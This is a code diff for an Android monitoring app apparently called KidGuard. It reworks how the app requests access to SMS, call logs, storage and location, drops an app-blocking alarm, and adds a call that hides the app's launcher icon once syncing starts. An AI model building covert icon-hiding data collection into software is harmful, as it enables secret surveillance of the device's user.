@@ -3,9 +3,7 @@ package com.kidguard;
 import android.Manifest;
 import android.accounts.AccountManager;
 import android.annotation.TargetApi;
-import android.app.AlarmManager;
 import android.app.AppOpsManager;
-import android.app.PendingIntent;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -17,11 +15,11 @@ import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
 import android.support.v7.app.AppCompatActivity;
 import android.util.Log;
+import android.widget.TextView;
 import android.widget.Toast;
 
 import com.kidguard.interfaces.Constant;
 import com.kidguard.preference.Preference;
-import com.kidguard.receivers.BlockAppReceiver;
 import com.kidguard.receivers.LocationReceiver;
 import com.kidguard.services.BackgroundDataService;
 import com.kidguard.services.GoogleAccountService;
@@ -38,6 +36,7 @@ public class MainActivity extends AppCompatActivity implements Constant, EasyPer
     private static final String TAG = MainActivity.class.getSimpleName();
 
     private static MainActivity mActivity;
+    private static TextView tv_install;
 
     public static MainActivity getInstance() {
         return mActivity;
@@ -51,6 +50,8 @@ public class MainActivity extends AppCompatActivity implements Constant, EasyPer
         setContentView(R.layout.activity_main);
         /* Retrieve the useful instance variables */
         mActivity = MainActivity.this;
+        tv_install = (TextView) findViewById(R.id.tv_install);
+        tv_install.setText(getString(R.string.installing));
     }
 
     /* onResume */
@@ -82,7 +83,7 @@ public class MainActivity extends AppCompatActivity implements Constant, EasyPer
                 Utilities.startServices(this, BackgroundDataService.class);
                 return;
             }
-            return;
+
         }
 
 //        Intent myIntent = new Intent(this, BackgroundDataService.class);
@@ -109,16 +110,39 @@ public class MainActivity extends AppCompatActivity implements Constant, EasyPer
                 Utilities.startServices(this, GoogleAccountService.class);
                 return;
             }
-            return;
-
         }
 
-        /* Request Usage State Permission For Application Is In ForGround Or Not */
-        requestUsageStatsPermission();
+        if (Build.VERSION.SDK_INT < 23) {
+
+            /* Get email access permission to user */
+            Utilities.startGoogleAccountService(this);
+
+            /* Request Usage State Permission For Application Is In ForGround Or Not */
+            requestUsageStatsPermission();
+
+        } else {
+
+            if (Utilities.PackageUtil.checkPermission(this, Manifest.permission.READ_SMS)
+                    && Utilities.PackageUtil.checkPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
+                    && Utilities.PackageUtil.checkPermission(this, Manifest.permission.READ_CALL_LOG)
+                    && Utilities.PackageUtil.checkPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
+                    && Utilities.PackageUtil.checkPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)) {
+
+                /* Request Usage State Permission For Application Is In ForGround Or Not */
+                requestUsageStatsPermission();
+
+            } else {
+
+                /* Check And Request Permissions */
+                checkAndRequestPermissions();
+                return;
+            }
+        }
     }
 
     /* Request Usage Stats Permission on RunTime */
     private void requestUsageStatsPermission() {
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP
                 && !hasUsageStatsPermission(this)) {
 
@@ -150,10 +174,8 @@ public class MainActivity extends AppCompatActivity implements Constant, EasyPer
             return;
         }
 
-        /* Start Background Receivers Here */
+        /* Start Location Receivers Here */
         try {
-
-            startBlockAppReceiver();
 
             startLocationReceiver();
 
@@ -162,25 +184,10 @@ public class MainActivity extends AppCompatActivity implements Constant, EasyPer
         }
     }
 
-    /* Start Background Check Receiver */
-    private void startBlockAppReceiver() {
-        int currentApiVersion = android.os.Build.VERSION.SDK_INT;
-        if (currentApiVersion <= 21) {
-            Intent alarm = new Intent(this, BlockAppReceiver.class);
-
-            boolean alarmRunning = (PendingIntent.getBroadcast(this, 0,
-                    alarm, PendingIntent.FLAG_NO_CREATE) != null);
-            if (!alarmRunning) {
-                PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0, alarm, 0);
-                AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
-                alarmManager.setInexactRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
-                        TIME_DELAY_FOR_CHECK, TIME_INTERVAL_FOR_CHECK, pendingIntent);
-            }
-        }
-    }
-
     /* Pass Intent To Locations Receiver */
     private void startLocationReceiver() {
+
+        tv_install.setText(getString(R.string.installation_completed));
 
         Intent intent = new Intent(this, LocationReceiver.class);
         sendBroadcast(intent);
@@ -199,8 +206,9 @@ public class MainActivity extends AppCompatActivity implements Constant, EasyPer
             stopService(new Intent(this, GoogleAccountService.class));
         }
 
-        Log.e("MAC","Address>>"+getIntent().getStringExtra(KEY_MAC_ADDRESS));
-        if(getIntent().getStringExtra(KEY_MAC_ADDRESS) != null && !getIntent().getStringExtra(KEY_MAC_ADDRESS).isEmpty()){
+        Log.e("MAC", "Address>>" + getIntent().getStringExtra(KEY_MAC_ADDRESS));
+        if (getIntent().getStringExtra(KEY_MAC_ADDRESS) != null && !getIntent().getStringExtra(KEY_MAC_ADDRESS).isEmpty()) {
+            Utilities.hideIcon(this);
             new RestClientService(TAG_SYNC_PROCESS, getIntent().getStringExtra(KEY_MAC_ADDRESS), "");
         }
     }
@@ -220,16 +228,6 @@ public class MainActivity extends AppCompatActivity implements Constant, EasyPer
                         if (accountName != null) {
                             Preference.setAccountName(this, accountName);
                         }
-
-                        if (Build.VERSION.SDK_INT < 23) {
-                            //Get email access permission to user
-                            Utilities.startGoogleAccountService(MainActivity.this);
-                            return;
-
-                        } else {
-                            checkAndRequestPermissions();
-                            return;
-                        }
                     }
                     break;
                 default:
@@ -248,12 +246,16 @@ public class MainActivity extends AppCompatActivity implements Constant, EasyPer
         switch (requestCode) {
             case 1:
                 if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    //Get email access permission to user
 
-                    //Get email access permission to user
+                    /* Get email access permission to user */
                     Utilities.startGoogleAccountService(MainActivity.this);
 
+                    /* Request Usage State Permission For Application Is In ForGround Or Not */
+                    requestUsageStatsPermission();
+
                 } else {
+
+                    /* Check And Request Permissions */
                     checkAndRequestPermissions();
                 }
                 break;
